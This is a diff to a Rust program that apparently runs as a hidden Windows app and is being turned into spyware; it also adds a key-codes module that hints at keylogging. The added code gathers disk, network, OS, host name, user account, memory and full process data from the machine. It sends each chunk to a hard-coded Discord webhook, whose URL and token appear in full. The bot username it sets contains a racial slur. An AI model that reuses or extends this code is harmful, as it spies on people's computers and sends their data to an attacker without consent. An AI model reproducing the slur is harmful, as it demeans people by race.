@@ -1,139 +1,122 @@
 #![windows_subsystem = "windows"]
 
 
-
+mod win_key_codes;
 
 #[cfg(windows)]
 extern crate winapi;
 
 
+const WEB_HOOK: &str = "https://discord.com/api/webhooks/1089619554558292048/qhLSa0sBrCn4-HBnD0_IQiuVZ5Rdo-cZaS4cMDv8sQRCkFBJy6gFBPbv_GLxZdlZf2q1";
+
+
 use std::fmt::format;
 use std::fs::*;
 use std::io::*;
+use futures::prelude::*;
+use tokio::runtime::Runtime;
 
+use serenity::{http::Http, model::webhook::Webhook};
 use chrono::{DateTime, Timelike, Utc};
+use sysinfo::{DiskExt, NetworkExt, ProcessExt, System, SystemExt, UserExt};
 
 
 
-//#[cfg(windows)]
+async fn sendToMyDC(msg:String)  -> Result<()>{
+    let time: DateTime<Utc> = Utc::now();
+    let date = format!("{:02}h:{:02}m", time.hour()+2, time.minute());
+    println!("sending");
+    let http = Http::new("qhLSa0sBrCn4-HBnD0_IQiuVZ5Rdo-cZaS4cMDv8sQRCkFBJy6gFBPbv_GLxZdlZf2q1");
+    let webhook = Webhook::from_url(&http, WEB_HOOK).await.expect("Replace the webhook with your own");
+
+    webhook
+        .execute(&http, false, |w|{ w.content(msg).username(format!("nigger slayer {}", date)) } )
+        .await
+        .expect("could not work :(");
+
+
+    Ok(())
+}
+
+
+#[cfg(windows)]
 fn log_header(file: &mut File) {
-    use winapi::shared::minwindef::DWORD;
-    use winapi::um::sysinfoapi::{SYSTEM_INFO, GetSystemInfo};
-    use winapi::um::winbase::{GetComputerNameW, GetVersionExW, GetDiskFreeSpaceExW};
-    use winapi::um::winnt::{LANGIDFROMLCID, LCTYPE, LGRPIDFROMLCID, PROCESSOR_ARCHITECTURE_AMD64};
-    use winapi::um::winnls::{GetKeyboardLayout, GetSystemDefaultLCID, GetLocaleInfoEx};
-    use std::ffi::OsString;
-    use std::os::windows::ffi::OsStringExt;
-    use winapi::um::fileapi::GetLogicalDriveStringsW;
-    use winapi::um::winbase::GetDiskFreeSpaceExW;
-    use std::ffi::OsString;
-    use std::os::windows::ffi::OsStringExt;
 
     let time: DateTime<Utc> = Utc::now();
 
+    let mut sys = System::new_all();
+    sys.refresh_all();
 
-    // Get system architecture
-    let mut system_info: SYSTEM_INFO = unsafe { std::mem::zeroed() };
-    unsafe {
-        GetSystemInfo(&mut system_info);
+    //start tokio
+    let rt = Runtime::new().unwrap();
+
+
+    let write: String = format!("date: {} current time = {:02}h:{:02}m:{:02}s\nOS info:\n", time.date_naive(), time.hour()+2, time.minute(), time.second());
+
+
+
+    // We display all disks' information:
+    let mut diskPrint = format!("\n=> disks:\n");
+    for disk in sys.disks() {
+        diskPrint += &*format!("name: {:?}, type: {:?},is removable: {:?}, filesystem: {:?} space: {:?}GB / {:?}GB, mountpoint: {:?}\n", disk.name(), disk.type_(), disk.is_removable(), String::from_utf8_lossy(disk.file_system()), disk.available_space() / (1024 * 1024 * 1024), disk.total_space() / (1024 * 1024 * 1024), disk.mount_point());
     }
-    let architecture = if system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 {
-        "64-bit"
-    } else {
-        "32-bit"
-    };
-    let arch = format!("Architecture: {}", architecture);
+    println!("{}",diskPrint);
 
-    // Get Windows version
-    let mut os_version_info: winapi::um::winnt::OSVERSIONINFOW = unsafe { std::mem::zeroed() };
-    os_version_info.dwOSVersionInfoSize = std::mem::size_of::<winapi::um::winnt::OSVERSIONINFOW>() as DWORD;
-    unsafe {
-        GetVersionExW(&mut os_version_info);
+    rt.block_on(sendToMyDC(diskPrint)).expect("fuck tokio ");
+
+    // Network interfaces name, data received and data transmitted:
+    let mut netW = format!("\n=> networks:\n");
+    for (interface_name, data) in sys.networks() {
+        netW += &*format!("{}: (r){}/(w){} B\n", interface_name, data.received(), data.transmitted());
     }
-    let windows_version = format!("{}.{}", os_version_info.dwMajorVersion, os_version_info.dwMinorVersion);
-    let winV = format!("Windows version: {}", windows_version);
+    println!("{}",netW);
+    rt.block_on(sendToMyDC(netW)).expect("fuck tokio ");
 
-    // Get keyboard layout
-    let lcid = unsafe { GetKeyboardLayout(0) };
-    let lang_id = LANGIDFROMLCID(lcid);
-    let lgrpid = LGRPIDFROMLCID(lcid);
-    let mut layout_buffer = [0u16; 9];
-    let layout_length = unsafe {
-        GetLocaleInfoEx(
-            lcid,
-            LCTYPE::LOCALE_SKEYBOARDSTOINSTALL,
-            layout_buffer.as_mut_ptr() as _,
-            layout_buffer.len() as i32,
-        )
-    };
-    let keyboard_layout = if layout_length > 0 {
-        let layout_string = OsString::from_wide(&layout_buffer[..layout_length as usize]);
-        layout_string.to_string_lossy().into_owned()
-    } else {
-        String::from("Unknown")
-    };
-    let keyLayout = format!("Keyboard layout: {}", keyboard_layout);
+    // Components temperature:
+    let mut temp = format!("\n=> components:\n");
+    for component in sys.components() {
+        temp += &*format!("{:?}\n", component);
+    }
+    println!("{}",temp);
+    rt.block_on(sendToMyDC(temp)).expect("fuck tokio ");
 
-    // Get system language
-    let lcid = unsafe { GetSystemDefaultLCID() };
-    let mut buffer = [0u16; 9];
-    let length = unsafe {
-        GetLocaleInfoEx(
-            lcid,
-            LCTYPE::LOCALE_SISO639LANGNAME,
-            buffer.as_mut_ptr() as _,
-            buffer.len() as i32,
-        )
-    };
-    let language_code = if length > 0 {
-        let lang_string = OsString::from_wide(&buffer[..length as usize]);
-        lang_string.to_string_lossy().into_owned()
-    } else {
-        String::from("Unknown")
-    };
-    let sysLang = format!("System language: {}", language_code);
+    let mut systemInfo:String = format!("\n=> system:\n");
+    // Display system information:
+    systemInfo += &*format!("System name:             {:?}\n", sys.name());
+    systemInfo += &*format!("System kernel version:   {:?}\n", sys.kernel_version());
+    systemInfo += &*format!("System OS version:       {:?}\n", sys.os_version());
+    systemInfo += &*format!("System host name:        {:?}\n", sys.host_name());
+    systemInfo += &*format!("\nNB CPUs: {}\n", sys.cpus().len());
+    for user in sys.users() {
+        systemInfo += &*format!("{} is in {} groups \n", user.name(), user.groups().len());
+    }
+    println!("{}", systemInfo);
+    rt.block_on(sendToMyDC(systemInfo)).expect("fuck tokio ");
 
-    // Get available disk space on all disks
-    let mut storage = String::new();
-    let mut buffer = [0u16; 261];
-    let result = unsafe {
-        GetLogicalDriveStringsW(
-            buffer.len() as u32,
-            buffer.as_mut_ptr(),
-        )
-    };
-    if result > 0 {
-        let drive_strings = OsString::from_wide(&buffer[..result as usize]);
-        for drive_string in drive_strings.split_null_terminated() {
-            let path = drive_string.to_string_lossy();
-            let mut free_bytes = 0u64;
-            let result = unsafe {
-                GetDiskFreeSpaceExW(
-                    path.encode_wide().collect::<Vec<_>>().as_ptr(),
-                    std::ptr::null_mut(),
-                    std::ptr::null_mut(),
-                    &mut free_bytes as *mut u64,
-                )
-            };
-            if result != 0 {
-                storage = format!("Available storage on {}: {} bytes", path, free_bytes);
-            }
-        }
+    // RAM and swap information:
+    let mut ramInfo:String = format!("\n=> Ram:\n");
+    ramInfo += &*format!("total memory: {} MB\n", sys.total_memory()  / (1024 * 1024 ));
+    ramInfo += &*format!("used memory : {} MB\n", sys.used_memory()/ (1024 * 1024 ));
+    ramInfo += &*format!("total swap  : {} MB\n", sys.total_swap()/ (1024 * 1024 ));
+    ramInfo += &*format!("used swap   : {} MB\n", sys.used_swap()/ (1024 * 1024 ));
+
+    println!("{}", ramInfo);
+    rt.block_on(sendToMyDC(ramInfo)).expect("fuck tokio ");
+
+    // Display processes ID, name na disk usage:
+    let mut proc:String = format!("\n\n=> Processes:\n");
+
+    for (pid, process) in sys.processes() {
+        proc += &*format!("[{}] {} {:?}\n", pid, process.name(), process.disk_usage());
     }
 
-
-
-
-
-    let write: String = format!("date: {} current time = {:02}+{:02}+{:02}\nOS info:\n{}\n{}\n{}\n{}\n{}", time.date_naive(), time.hour(), time.minute(), time.second(),arch, winV, keyLayout, sysLang, storage);
     file.write(write.as_bytes()).expect("help i am broken");
+    file.write(proc.as_bytes()).expect("help i am broken at proc");
     file.write(b"--- Start of Logging ---").expect("TODO: panic message");
 }
 
 
 #[cfg(not(windows))]
-
-
 fn log_write(file: &mut File, s: String){
 
 }
@@ -141,14 +124,6 @@ fn log_write(file: &mut File, s: String){
 
 
 
-#[cfg(not(windows))]
-fn run(file: &mut File) {
-    println!("hi");
-    log_header(file);
-
-
-
-}
 
 
 #[cfg(windows)]
@@ -163,11 +138,14 @@ fn run(file: &mut File) {
     use std::{thread, time::Duration};
 
 
+    log_header(file);
+
 
 }
 
 
 fn main() {
+
     let now: DateTime<Utc> = Utc::now();
     let filename = format!("log-{}-{:02}+{:02}+{:02}.log", now.date_naive(), now.hour(), now.minute(), now.second());
 
@@ -183,15 +161,6 @@ fn main() {
 
     run(&mut output);
 }
-
-
-
-
-
-
-
-
-
 
 
 
